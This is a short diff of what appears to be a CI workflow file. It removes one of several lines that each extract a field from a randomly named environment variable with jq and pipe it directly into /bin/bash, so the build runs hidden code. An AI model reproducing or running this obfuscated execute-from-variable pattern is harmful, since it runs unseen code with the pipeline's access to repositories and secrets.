@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$gpnr1628" | jq -r .ngw0981 | /bin/bash
           echo $mypu4935 | jq -r .q3802 | /bin/bash
           echo $shejw05 | jq -r .tdsyc2 | /bin/bash
-          echo $h1721 | jq -r .kmy793 | /bin/bash
           echo $sqg53302 | jq -r .dbskr4 | /bin/bash
           echo $nxlor76 | jq -r .opx22297 | /bin/bash
 
